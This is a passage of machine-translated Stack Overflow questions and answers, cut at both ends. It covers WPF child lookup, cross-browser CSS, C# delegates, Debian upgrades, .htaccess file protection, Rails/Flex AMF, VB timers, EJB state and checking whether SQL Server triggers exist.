      int childrenCount = VisualTreeHelper.GetChildrenCount(parent);
      for (int i = 0; i < childrenCount; i++)
      {
        var child = VisualTreeHelper.GetChild(parent, i);
        // If the child is not of the request child type child
        T childType = child as T;
        if (childType == null)
        {
          // recursively drill down the tree
          foundChild = FindChild<T>(child, childName);

          // If the child is found, break so we do not overwrite the found child. 
          if (foundChild != null) break;
        }
        else if (!string.IsNullOrEmpty(childName))
        {
          var frameworkElement = child as FrameworkElement;
          // If the child's name is set for search
          if (frameworkElement != null && frameworkElement.Name == childName)
          {
            // if the child's name is of the request name
            foundChild = (T)child;
            break;
          }

 // recursively drill down the tree
          foundChild = FindChild<T>(child, childName);

          // If the child is found, break so we do not overwrite the found child. 
          if (foundChild != null) break;

        else
        {
          // child element found.
          foundChild = (T)child;
          break;
        }
      }

      return foundChild;
    } 
```

如果类型匹配但名称不匹配，您只需要继续递归调用该方法（当您传递`FrameworkElement`as时会发生这种情况`T`）。否则它会返回`null`，这是错误的。

* * *

## 回答 #19

> 赞同：-2
> 
> 时间：2020-12-26T20:56:11.083

我能够使用下面的代码按名称查找对象。

`stkMultiChildControl = stkMulti.FindChild<StackPanel>("stkMultiControl_" + couter.ToString());`

* * *

## 回答 #20

> 赞同：-8
> 
> 时间：2015-03-23T05:57:03.007

试试这个

```
<TextBlock x:Name="txtblock" FontSize="24" >Hai Welcom to this page
</TextBlock> 
```

代码背后

```
var txtblock = sender as Textblock;
txtblock.Foreground = "Red" 
```

# html - 如何制作在不同浏览器中看起来相同的 html 填充？

> ID：636389
> 
> 赞同：1
> 
> 时间：2009-03-11T21:10:20.920
> 
> 标签：html, css, cross-browser, padding

我有一个博客，[www.realcanadianenglish.blogspot.com](http://www.realcanadianenglish.blogspot.com)。我用火狐来写。有时我会使用 Internet Explorer 查看博客。后者有时会显示图片和文字之间的差距。我可以更改 HTML 代码来解决这个问题吗？为什么两者之间存在差异：Explorer 和 Firefox？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-12T02:21:36.943

您指的是[IE 模型错误](http://en.wikipedia.org/wiki/Internet_Explorer_box_model_bug)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-11T21:15:40.097

Internet Explorer 可以在某些元素上具有额外的填充。我建议您先尝试包含一个 CSS 重置文件，然后再包含您自己的 CSS 文件。

这是关于 CSS 重置文件[的一个很好的 Stackoverflow 问题](https://stackoverflow.com/questions/167531/is-it-ok-to-use-a-css-reset-stylesheet)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-11T21:17:10.750

该博客在 IE8 上看起来不错。如果您遇到问题，我建议您运行 IE8 并使用提供的调试工具（按 F12）。您可以从浏览器内部动态更改 HTML 和 CSS。它比每次您想测试更改时都上传新模板要快。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2010-02-21T19:10:31.420

在大多数情况下，问题将出在 IE 上，在这些情况下，有时最好或至少方便地为 IE 提供一两行以使其与其他更现代的带有“条件注释”的浏览器保持一致。这些注释只能被 IE 识别，但最终允许您包含不会影响其他浏览器的样式或 html。它们易于使用，但根据您所针对的 IE 版本有一些变化。这是解释它们的链接：http: [//msdn.microsoft.com/en-us/library/ms537512 (VS.85).aspx](http://msdn.microsoft.com/en-us/library/ms537512(VS.85).aspx)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-03-02T18:42:56.123

这里是了解 IE CSS 错误的最佳地点：[http ://www.positioniseverything.net/ie-primer.html](http://www.positioniseverything.net/ie-primer.html)

# c# - 在下面的代码中解释委托是如何工作的？

> ID：636393
> 
> 赞同：0
> 
> 时间：2009-03-11T21:11:28.407
> 
> 标签：c#, .net, delegates

我很好奇以下代码是如何工作的，尤其是包含委托内容的部分，因为我是新手。此外，代码中是否存在任何瓶颈，例如，使用 SortedDictionary 会比使用 List 然后使用 LINQ 对其进行排序更好吗？好的，代码如下：

```
public class ColorManager
{
    private List<ColorData> colorCodes = new List<ColorData>();

    public List<ColorData> ColorCodes
    {
        get
        {
            var sortList = from a in this.colorCodes
                           orderby a.colorCode ascending
                           select a;

            return sortList.ToList();
        }
    }

    public void FillData(DataTable table)
    {
        for(int row = 0; row < table.Rows.Count; row++)
        {
            ColorData cData = new ColorData();
            string name = table.Rows[row]["Color"].ToString().Trim();

            if(!this.colorCodes.Exists(
                delegate(ColorData e)
                {
                    return e.ColorCode == name;
                }))
            {
                cData.Add(table.Rows[row]["Color"].ToString());
                this.colorCodes.Add(cData);
            }
            else
            {
                this.colorCodes.Find(
                    delegate(ColorData e)
                    {
                        return e.ColorCode == name;
                    }).Count++;
            }
        } 
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-11T21:20:51.083

> 我很好奇以下代码是如何工作的，尤其是包含委托内容的部分，因为我是新手。

首先看一下这个`ColorCodes`属性访问器：

```
 var sortList = from a in this.colorCodes
                       orderby a.colorCode ascending
                       select a; 
```

`this.colorCodes`它按升序 ( )返回所有颜色代码 ( ) 的列表`...orderby a.colorCode ascending`。到目前为止很简单。更肉的`FillData`方法怎么样？

首先，我们将遍历此表中的每一行：

```
 for(int row = 0; row < table.Rows.Count; row++)
    { 
```

然后，我们将查看`Color`当前行的列。

```
 ColorData cData = new ColorData();
        string name = table.Rows[row]["Color"].ToString().Trim(); 
```

如果该列在我们的颜色代码列表中没有匹配项，则此`if`条件为真。该`Exists`方法采用一个返回布尔值的单参数函数，这就是这个匿名委托的含义：一个`ColorData e`返回布尔值 () 的单参数 () 函数`e.ColorCode == name`。它被否定 ( `!this.[...]`)，因此如果找到匹配项，则条件为假。

```
 if(!this.colorCodes.Exists(
            delegate(ColorData e)
            {
                return e.ColorCode == name;
            }))
        {
            cData.Add(table.Rows[row]["Color"].ToString());
            this.colorCodes.Add(cData);
        } 
```

否则，如果匹配，则使用另一个匿名委托查找名称，并将该颜色的项目数加一。

```
 else
        {
            this.colorCodes.Find(
                delegate(ColorData e)
                {
                    return e.ColorCode == name;
                }).Count++;
        }
    } 
```

请注意，此代码有些低效，因为两个不同的匿名委托确实做同样的事情并且可以共享。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-11T21:26:24.470

实际上，那里的代表比您预期的要多。LINQ 查询：

```
 var sortList = from a in this.colorCodes
                       orderby a.colorCode ascending
                       select a; 
```

实际上是：

```
var sortList = this.colorCodes.OrderBy(a => a.colorCode); 
```

其中（对于 LINQ-to-Objects）与以下内容相同：

```
var sortList = this.colorCodes.OrderBy(delegate (ColorData a) {
  return a.colorCode;
}) 
```

这使用一个委托来标识要排序的项目 - 即“给定一个 ColorData，我会给你 colorCode”。请注意，许多`select`用途*也*涉及委托，但在这种情况下不涉及（`select a`编译器删除了琐碎的内容）。

在代码中：

```
 if(!this.colorCodes.Exists(
            delegate(ColorData e)
            {
                return e.ColorCode == name;
            })) 
```

我们正在使用谓词；“给定一个 ColorData，我会通过测试名称是否相等来告诉你它是否匹配”。请注意，`name`这里是“捕获”到委托中的，这涉及一些相当复杂的编译器技巧（我不会描述它们）。

* * *

再效率；很难确定，但也许：

```
 Dictionary<string, ColorData> items = new Dictionary<string, ColorData>();
    foreach(DataRow row in table.Rows) {
        string name = row["Color"].ToString().Trim();
        ColorData cData;
        if (items.TryGetValue(name, out cData)) {
            cData.Count++;
        } else {
            cData.Add(name);
            colorCodes.Add(cData);
            items.Add(name, cData);
        }
    } 
```

这避免了很多重复，并使用字典来查找值，而不是经常使用包含/查找。在许多情况下，LINQ`GroupBy`可能会有所帮助，但在这种情况下可能没有。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-11T21:15:47.290

它是一个匿名委托，用作查找表达式的选择标准。换句话说，如果颜色等于 name 给定的颜色，它将返回 true，Find 会将其添加到它正在生成的 IEnumerable 中。如果它返回 false，Find 将不包含它。它可以更简洁地写成

```
p => p.ColorCode == name 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-11T21:16:04.120

Exists 和 Find 是通用扩展方法。他们 for each 循环遍历集合中的每个项目。向委托传递一个参数（定义为“（ColorData e）”），并返回一个布尔值。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-11T21:16:29.673

代表：

此示例中的委托正在实现一个 Func 方法。基本上，您正在做的是动态创建一个采用 ColorData 参数并返回布尔值的方法。

这使您可以对 IEnumerable 集合的每个成员进行 Exists() 和 Find() 调用以进行检查和过滤。

至于排序字典：

如果这是你唯一使用它的地方，你最好使用 SortedDictionary，因为你不会经常使用它。现在，每次您调用 ColorCodes 时，您都在诉诸。SortedDictionary 将不断排序。

# linux - LINUX：升级生产机器

> ID：636394
> 
> 赞同：0
> 
> 时间：2009-03-11T21:11:31.090
> 
> 标签：linux, debian, upgrade, sysadmin

我们的生产机器在 debian etch 上运行。现在，他们终于发布了 lenny，我们需要升级这些系统的那一天将到来。我怎样才能以最小的风险做到这一点？是否有任何前提、备用方案的准备以及我是否需要一个 B 计划以防出现问题？除了由 debian 安装程序处理的二进制包之外，还有一些已编译的应用程序在机器上运行。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-11T21:33:18.213

就个人而言，我不会在重要服务器上升级任何操作系统。操作系统升级总是有可能出现细微的错误，无论是 Windows、Linux 还是其他任何东西。Debian 在这方面比以前更好了。dist-upgrade 几乎不像过去那样频繁地使用机器。但是对于生产机器来说，冒险是没有意义的。

使用全新的操作系统和应用程序部署设置新服务器，并在需要时将它们换掉。无需急于一次性更换全公司的 Etch。它将在一段时间内得到安全更新的支持。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-11T21:20:00.197

刚刚经历了一些开发框的过渡，我想指出您可能想要重新编译您将链接的任何自定义库。Lenny 使用 GCC 4.3，而 Etch 使用 4.1。任何一个编译器的输出都与另一个编译器不太兼容。您可能需要安装 gcc-4.1 包来执行诸如编译自定义内核模块之类的操作。

如果您使用具有插件界面的 3rd 方工具，您可能会遇到挑战。我一直无法让 Matlab 插件（mex 文件）工作。

我建议从测试系统开始。在敲打一段时间并验证一切正常后，将其切换为生产盒。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T21:17:04.947

大多数人不会出于这个原因更新生产服务器——如果它工作正常，除非你有令人信服的理由，否则你不会更新。

假设您有一个与生产机器类似的开发盒，您可以在开发盒上模拟更新。

# apache - 如何编辑 .htaccess 文件以拒绝热链接到 .css、.inc 文件？

> ID：636402
> 
> 赞同：4
> 
> 时间：2009-03-11T21:12:52.147
> 
> 标签：apache

我在我的网站上的一个名为 functions.inc 的文件中有我的函数。如何通过直接访问[http://example.com/functions.inc来编辑 .htaccess 文件以拒绝用户查看它](http://example.com/functions.inc)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-11T21:20:08.433

```
<Files ~ "\.inc$">
Order allow,deny
Deny from all
</Files> 
```

如果您没有安装 mod_rewrite 很有用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-11T21:15:16.540

我为此使用 mod_rewrite。对于图像等，这是一个标准，包括：

```
RewriteCond %{HTTP_REFERER} !^$
RewriteCond %{HTTP_REFERER} !^https?://myhostname\.com/.*$ [NC]
RewriteRule \.(gif|jpe?g|png|js|css)$ - [F] 
```

您可以将“inc”添加到最后一条规则的扩展列表中。

但是为了防止访问特定的文件类型，我更喜欢这样的东西：

```
RewriteCond %{THE_REQUEST} ^\w+\ /include/ [OR]
RewriteCond %{THE_REQUEST} \.php\ HTTP/
RewriteRule ^.*$ - [R=404,L] 
```

这做了两件事：

1.  第一条规则排除了外部请求对 /include 目录的访问，但您仍然可以包含/要求它们；和
2.  第二条规则限制对以 .php 结尾的文件名的访问。您可以对 .inc 文件使用相同的内容。

在这两种情况下，Apache 都会给出 404 错误（未找到文件），我发现这更好。一般来说，最好说某些东西不存在（您不希望人们看到），而不是说它存在但您无法访问它。但这只是个人意见。

至于我为什么要限制 .php 文件不能直接访问：我使用 mod_rewrite 创建“不错”的 URL。代替：

```
/account/order.php 
```

它的：

```
/account/order 
```

这样做的原因有很多。美学是其中之一。SEO 是另一个（如果你有 /account/order/123 而不是 /account/order.php?item=123）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-11T22:01:56.880

我更喜欢伪装文件而不是仅仅禁止访问它。因此，我更喜欢 mod_rewrite 解决方案来响应 404 状态代码（自 Apache 2.2 起），正如 cletus 已经提到的。但是如果像 Byron 提到的那样 mod_rewrite 不可用，我也会使用后备。

因此，让我们将两者结合起来：

```
<IfModule mod_rewrite.c>
    RewriteEngine on
    # .inc files
    RewriteRule \.inc(/|$) - [L,R=404]
    # URI paths starting with /include/
    RewriteRule ^include/ - [L,R=404]
</IfModule>
<IfModule !mod_rewrite.c>
    <Files ~ "\.inc$">
        Order allow,deny
        Deny from all
    </Files>
</IfModule> 
```

# ruby-on-rails - 从 Flex 向 Rails 发送 AMF 对象会损坏关联模型

> ID：636403
> 
> 赞同：-1
> 
> 时间：2009-03-11T21:13:12.567
> 
> 标签：ruby-on-rails, apache-flex, amf, weborb

我们正在开发一个将 Flex 和 rails 与[WebORB](http://www.themidnightcoders.com/products/weborb-for-rails/overview.html)结合使用的项目。在我们开始将前端和后端捆绑在一起之前，一切都很好。

我们创建了一个用于与用户交互的服务，另一个用于会话。

`SessionService.rb`

```
class SessionService
  def view_session
    session = RequestContext.get_session

    if session[:user_id]
      user = User.find_by_id(session[:user_id], :include => [:contact, {:roles => :permissions}])
    else
      user = User.find_by_username("anonymous", :include => [:contact, {:roles => :permissions}])
    end

    user
  end
end 
```

`UserService.rb`

```
class UserService
  def register_user user
    user.save

    session = RequestContext.get_session
    session[:user_id] = user.id
    RequestContext.set_session session

    return true
  end
end 
```

`User.as`

```
package com.XXX.XXXXX.vo
{
    [Bindable]
    [RemoteClass(alias="com.XXX.XXXXX.vo.User")]
    public class User
    {
        ...
        public var roles:Array;
        ...
    }
} 
```

当使用 Flex 调用任何方法时，一切正常，直到调用传入的 User 对象。创建了用户并更新了会话，问题是在此之后的任何方法调用都会产生现在为零`register_user`的副作用，`User.find(XX).roles[XX].skip_time_zone_conversion_for_attributes`这会导致`create_time_zone_conversion_attribute?`在`activerecord/lib/activerecord/attribute_methods.rb`尝试调用`include?`它时失败。

并且由于`create_time_zone_conversion_attribute?`在调用时`method_missing`调用，直接访问任何属性都会导致此错误。这不会是一个问题，除非`:include => [..., :roles...]`它会导致角色被序列化到[AMF](http://en.wikipedia.org/wiki/Action_Message_Format)中，并且当它尝试序列化属性时，它会爆炸。

从我收集到的信息`attribute_methods.rb`来看，应该不可能`skip_time_zone_conversion_for_attributes`在一个实例中进行更改（`Role.skip_time_zone_conversion_for_attributes = []`应该是这样），但我感觉 WebORB 正在绕过这个并强行将其更改为 nil。

我们已经切换到传递非模型类，但这不是我们想要的。

是否有可能找出 WebORB 中的哪些代码正在`skip_time_zone_conversion_for_attributes`针对模型的所有实例进行更改，而不是针对模型类本身？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-18T21:36:02.493

我们遇到了同样的问题，我们找到的唯一解决方案是不将 Flex 对象传递给具有关联的 Rails。

# vb.net - VB 2008 定期任务

> ID：636408
> 
> 赞同：0
> 
> 时间：2009-03-11T21:14:45.590
> 
> 标签：vb.net, visual-studio-2008, scheduled-tasks

在 VB 后台运行周期性任务的最简单方法是什么？

例如：使用当前时间每秒更新一个标签，同时仍然允许表单可用。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-11T21:21:55.010

1.  向表单添加`Timer`组件
2.  将其设置`Interval`为更新之间的时间
3.  启用计时器（通过设置其`Enabled`属性或调用其`Start`方法）
4.  通过执行任何必要的更新来处理其`Tick`事件。

您的处理程序看起来像这样：

```
Private Sub Timer1_Tick(ByVal sender As System.Object, _
                        ByVal e As System.EventArgs) Handles Timer1.Tick

   label1.Text = GetCurrentStatus()

End Sub 
```

# css - 样式化 CSS 中的嵌套列表

> ID：636412
> 
> 赞同：2
> 
> 时间：2009-03-11T21:15:13.997
> 
> 标签：css, css-selectors

我想在纯标记中构建一个树状导航界面（即，不需要 javascript/jquery 等）。

无序列表`<ul>`似乎是最好的解决方案，我发现[simplebits.com 上的本教程](http://www.simplebits.com/notebook/2003/10/19/styling_nested_lists.html)非常接近我需要的解决方案。然而，作者定义样式表时假设任何分支的最终/最大深度已知：

```
#sitemap li ul li ul li {
    padding-left: 16px;
    background: url(bullet.gif) no-repeat 0 50%;
} 
```

我想知道是否有办法让标记“无限”下降并让样式无缝支持这一点。

如果您需要对此进行更多说明，请告诉我。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-11T21:20:09.773

有这方面的教程，但有两个问题：

1.  IE6 不支持 :hover 在锚点以外的标签上，因此您需要针对该浏览器的 Javascript 解决方案；和
2.  让它在主要浏览器中一致地工作实际上非常复杂。

考虑使用 jQuery 和 superfish（受 sinkefish 启发）插件的替代方案：

```
<ul class="menu">
  <li>...
</ul>
<script type="text/javascript">
$(function() {
  $("ul.menu").superfish();
});
</script> 
```

完毕。

如果您确实走（半）纯 CSS 路线，我强烈建议您为此使用现有框架之一（如吸盘鱼或衍生品）。否则你只会把头发拉出来并花费大量时间让它正常工作。

回答你关于深度的问题：你提到的那个规则本质上是无限深度的。请记住 CSS 中的空格是后代选择器而不是子选择器。重复组的原因是该规则仅适用于（例如）第三级以下。

那是因为第一层和第二层会有特殊的样式。第一个将是水平或垂直条。第二个将从那里弹出，但从第三级开始，它将始终以相同的方式弹出。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-03-13T11:16:21.430

您提供的标记应该适用于任何其他元素，而无需直接指定它们。

**例如：**

```
#sitemap li {} -->level 1 and under
#sitemap li li {}--> level 2 and under (overrides previous rule)
#sitemap li li li {}--> level 3 and under (overrides previous rule) 
```

因此最后一条规则将自动应用于 4、5、6 级及更高级别。

除非您想要所有级别的特定样式，否则您应该没问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-11T21:21:29.740

如何为无序列表元素分配一个类？

```
#sitemap li.tree
{
   padding-left: 16px;
} 
```

我不明白为什么这不起作用，但如果我错了，请纠正我。

# .net - 你如何开始使用 Mono 诅咒？

> ID：636441
> 
> 赞同：5
> 
> 时间：2009-03-11T21:23:23.930
> 
> 标签：.net

我正在尝试创建一个交互式命令行程序，看来[Mono-Curses](http://www.mono-project.com/MonoCurses)是我需要的。但我对如何使用它感到非常困惑。我有一些问题。我真正需要什么来创建我的项目？我需要单声道还是可以使用 .net 框架？为什么那里有一个 .c 文件，我该怎么办？

如果有人可以帮助我设置所有必需的程序集，我们将不胜感激。

* * *

有谁知道可以用.net 做到这一点的图书馆？

我不介意将 Mono 用作个人项目。我只需要这些步骤来弄清楚我需要从 mono 下载什么才能使用该库。

我将在我的机器上进行本地开发，这是 vista。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-11T22:36:31.290

乍一看项目和源代码，似乎相当大比例的代码必须移植到 Windows - 恐怕它似乎是专门为 Linux 终端 (xterm) 设计的，可能是 Mono-特定的库。尤其是前者真正导致了这里的问题，因为两个操作系统之间的 API/接口差异很大。

我建议您尝试为基于控制台的应用程序找到一个 CLR (Windows) 库，而不是乱用这个库（尽管我不确定是否存在，因为与 *nix 相比，Windows 上命令行的重要性较低） . 老实说，你可能最好从头开始编写一个......如果你想走这条路，请尝试从 JConsole 库的 C# 端口开始，可在[此处下载](http://www.devsource.com/c/a/Using-VS/Working-with-Console-Screen-Buffers-in-NET/5/)（并附有一系列 6 个教程）。与 Win32 控制台的低级接口将是一个棘手的问题，但幸运的是，该库应该为您完成几乎所有工作。一旦你超越了那个阶段，它可能不会是一项伟大的任务——你甚至可以重用大部分 Mono-Curses 代码（其中似乎没有很多）。总之祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-11T22:20:04.483

我快速浏览了 Mono-Curses 中的一个源文件 (gui.cs)，它有

```
using Mono; 
```

所以你需要单声道。Mono 可用于 Windows（如果这是您正在开发的），但我不知道它如何与官方 .NET 框架交互。（即：它是作为完全替代品还是可以并排运行）。

# javascript - 用于 Canvas 标签的 Javascript Sprite 动画库

> ID：636442
> 
> 赞同：20
> 
> 时间：2009-03-11T21:23:41.140
> 
> 标签：javascript, animation, canvas, sprite

你能给我指出一个使用 HTML Canvas 标签的好的 Javascript sprite 动画库吗？

一些谷歌搜索只发现了一些非画布项目。我正在寻找干净简单的东西。

谢谢。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-03-11T22:40:16.367

[Processing](http://www.processing.org/)是一个很棒的可视化/动画框架，最近被移植到 JavaScript：[http](http://ejohn.org/blog/processingjs/) ://ejohn.org/blog/processingjs/ 。

希望有帮助:)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-03-12T01:07:59.070

还有[cake](http://glimr.rubyforge.org/cake/canvas.html)工具包，尽管它确实提供了与 processing.js 不同的功能（更接近 sprite 导向）（请参阅@SebaGR 的答案）。

不幸的是，我认为这些库中的任何一个都不能真正以有用/完整的方式构成一个精灵库。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-19T14:11:28.423

你可以看看 create.js ......它使用精灵表并且是为画布标签开发的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2011-01-18T14:22:06.317

下面是一些 javascript 游戏引擎的一个很好的列表：

[http://www.reddit.com/r/javascript/comments/f094j/list_of_js_game_engines_community_effort/](http://www.reddit.com/r/javascript/comments/f094j/list_of_js_game_engines_community_effort/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2011-03-18T09:26:16.663

我认为这可以更好：[http ://www.c3dl.org/](http://www.c3dl.org/)

# java - EJB 和在数据结构（映射、列表等）中存储对象

> ID：636450
> 
> 赞同：1
> 
> 时间：2009-03-11T21:26:47.137
> 
> 标签：java, jboss, jakarta-ee, ejb-3.0, ejb

是否可以在应用服务器正常运行期间将对象存储在数据结构中？基本上我想要一个与此数据结构接口的 EJB，但不需要完整的数据库解决方案。

作为一个例子，我制作了这个虚拟动物对象：

```
package com.test.entities;

public class Animal implements java.io.Serializable {

    private static final long serialVersionUID = 3621626745694501710L;
    private Integer id;
    private String animalName;

    public Integer getId() {
        // TODO Auto-generated method stub
        return id;
    }   
    public void setId(Integer id){
        this.id=id;
    }
    public String getAnimalName(){
        return animalName;

    }
    public void setAnimalName(String animalName){
        this.animalName=animalName;
    }
} 
```

所以这里是**EJB 远程**接口：

```
package com.test.beans;

import java.util.Map;

import javax.ejb.Remote;

import com.test.entities.Animal;

@Remote
public interface MapBeanRemote {

    public void addAnimal(Animal a);

    public void removaAnimal(Integer id);

    public Animal getAnimalById(Integer id);

    Map<Integer, Animal> getAllAnimals();

} 
```

这是会话 Bean：

```
package com.test.beans;

import java.util.ConcurrentHashMap;
import java.util.Map;

import javax.annotation.PostConstruct;
import javax.ejb.Stateless;

import com.test.entities.Animal;

@Stateless(mappedName="ejb/MapBean")
public class MapBean implements MapBeanRemote{

    Map<Integer, Animal> animalStore;

    @PostConstruct
    public void initialize(){
        animalStore = new ConcurrentHashMap<Integer,Animal>();
    }

    @Override
    public void addAnimal(Animal a) {
        if(a.getId()!=null){
            animalStore.put(a.getId(), a);
        }
    }

    @Override
    public Animal getAnimalById(Integer id) {
        return animalStore.get(id);
    }

    @Override
    public void removaAnimal(Integer id) {
        animalStore.remove(id);

    }

    @Override
    public Map<Integer, Animal> getAllAnimals() {
        return animalStore;
    }

} 
```

所以基本上我希望任何想要操作 Animal Map 的客户端都通过这个 EJB 并让每个客户端访问相同的对象 Map。

这个例子不够好。过了一会儿，所有的动物都被删除了（我假设当 EJB 从 bean 池中被替换时）这会以某种方式作为资源注入吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-11T21:54:00.037

这可以通过将 Map 放入 Singleton 并从 bean 访问此单例来完成。这样，所有 EJB 实例都有一个实例（因为它们共享相同的类加载器）。不同 EAR 中的不同会话 bean 将不起作用，因为它们每个都有自己的类加载器，但这似乎不是您的方案。

您现有的 ConcurrentHashMap 用法将足以处理您的大多数情况，但您仍然需要围绕 addAnimal 方法进行同步，因为您需要地图在两个方法调用之间保持一致。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-23T13:52:35.490

新的 EJB 3.1 规范提供了新类型的 bean - Singleton bean - 这正是您所需要的。我知道的唯一部分支持 EJB 3.1 的实现是 Apache OpenEJB 3.1。它包括 Singleton bean，但我还没有使用它们。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T21:42:41.077

这是一个无状态会话 bean。顾名思义，您不应该在这样的 bean 中持有任何类型的状态。EJB 容器可以与 bean 的多个实例一起工作以满足并发请求。如何同步所有实例的 Lists 数据？我觉得没有办法做到这一点。

将这样的 List 维护到提供业务逻辑的会话 bean 中，在我看来甚至违反了业务层的概念。您必须自己处理事务和并发写入。

为什么不在客户端保存动物列表？我认为这将是更好的方法。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-11T21:41:43.107

我认为最好的想法是将数据结构完全移出 EJB 并将其存储为静态数据结构。您可能是正确的，因为 EJB 正在池中，因此您的对象正在被擦除。

请注意，根据您如何实现对数据结构的访问，您需要同步访问以确保线程安全。

如果您想在 EJB 中维护状态，请考虑查看有状态会话 bean。此外，如果您确实想查看 bean 何时被销毁，您可以覆盖 ejbremove 方法，我忘记了 Java 5 的注释。

卡尔

# sql-server - 检查 SQL Server 中是否存在触发器的最便携方法是什么？

> ID：636452
> 
> 赞同：49
> 
> 时间：2009-03-11T21:26:54.110
> 
> 标签：sql-server, triggers, information-schema

我正在寻找**最便携**的方法来检查 MS SQL Server 中是否存在触发器。它至少需要在 SQL Server 2000、2005 和最好是 2008 上运行。

该信息似乎不在 INFORMATION_SCHEMA 中，但如果它在某处，我更愿意从那里使用它。

我确实知道这种方法：

```
if exists (
    select * from dbo.sysobjects 
    where name = 'MyTrigger' 
    and OBJECTPROPERTY(id, 'IsTrigger') = 1
) 
begin

end 
```

但我不确定它是否适用于所有 SQL Server 版本。

* * *

## 回答 #1

> 赞同：63
> 
> 时间：2009-03-11T21:33:46.980

还有首选的“sys.triggers”目录视图：

```
select * from sys.triggers where name = 'MyTrigger' 
```

或调用 sp_Helptrigger 存储过程：

```
exec sp_helptrigger 'MyTableName' 
```

但除此之外，我想就是这样:-)

马克

**更新（对于 Jakub Januszkiewicz）：**

如果您需要包含架构信息，您还可以执行以下操作：

```
SELECT
    (list of columns)
FROM sys.triggers tr
INNER JOIN sys.tables t ON tr.parent_id = t.object_id
WHERE t.schema_id = SCHEMA_ID('dbo')   -- or whatever you need 
```

* * *

## 回答 #2

> 赞同：34
> 
> 时间：2010-08-05T14:40:19.213

This works on SQL Server 2000 and above

```
IF OBJECTPROPERTY(OBJECT_ID('{your_trigger}'), 'IsTrigger') = 1
BEGIN
    ...
END 
```

Note that the naive converse doesn't work reliably:

```
-- This doesn't work for checking for absense
IF OBJECTPROPERTY(OBJECT_ID('{your_trigger}'), 'IsTrigger') <> 1
BEGIN
    ...
END 
```

...because if the object doesn't exist at all, `OBJECTPROPERTY` returns `NULL`, and `NULL` is (of course) not `<> 1` (or anything else).

On SQL Server 2005 or later, you could use `COALESCE` to deal with that, but if you need to support SQL Server 2000, you'll have to structure your statement to deal with the three possible return values: `NULL` (the object doesn't exist at all), `0` (it exists but is not a trigger), or `1` (it's a trigger).

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2011-11-12T23:27:35.827

Assuming it is a DML trigger:

```
IF OBJECT_ID('your_trigger', 'TR') IS NOT NULL
BEGIN
    PRINT 'Trigger exists'
END
ELSE
BEGIN
    PRINT 'Trigger does not exist'
END 
```

For other types of objects (tables, views, keys, whatever...), see: [http://msdn.microsoft.com/en-us/library/ms190324.aspx](http://msdn.microsoft.com/en-us/library/ms190324.aspx) under 'type'.

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-04-09T09:03:43.073

Tested and doesn't work on SQL Server 2000:

```
select * from sys.triggers where name = 'MyTrigger' 
```

* * *

Tested and works ok on SQL Server 2000 and SQL Server 2005:

```
select * from dbo.sysobjects
where name = 'MyTrigger' and OBJECTPROPERTY(id, 'IsTrigger') 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-12-08T12:29:53.960

In addition to the excellent answer by marc_s:

if the *existence check* is intended prior to dropping or modifying the trigger in some way, use a direct TSQL `try/Catch` bock, as the fastest means.

For instance:

```
BEGIN TRY
    DROP TRIGGER MyTableAfterUpdate;
END TRY
BEGIN CATCH
    SELECT ERROR_NUMBER() AS erno WHERE erno = 3701; -- may differ in SQL Server < 2005
END CATCH; 
```

The Error Message will be

```
Cannot drop the trigger 'MyTableAfterUpdate', because it does not exist or you do not have permission. 
```

Then simply check if the Executed Result returned rows or not, which is easy in direct sql as well as the programmatic APIs (C#,...).

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2014-07-16T17:31:20.497

If you're trying to find a server scoped DDL Trigger on SQL Server 2014, you should try sys.server_triggers.

```
IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'your trigger name')
BEGIN
    {do whatever you want here}
END 
```

If I told tou anything incorrect, please let me know.

Edit: I didn't check for this dm on another versions of SQL Server.

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-02-04T10:58:04.573

Are trigger names forced to be unique in SQL server?

As triggers are by definition applied to a specific table would it not be more efficient to restrict the search to only the table in question?

We have a database with over 30k tables in it all of which have at least one trigger and may have more (bad DB design - quite probably, but it made sense years ago and didn't scale well)

I use

```
SELECT * FROM sys.triggers 
WHERE [parent_id] = OBJECT_ID(@tableName) 
AND [name] = @triggerName 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2014-01-15T08:09:41.460

I would use this syntax to check and drop trigger

```
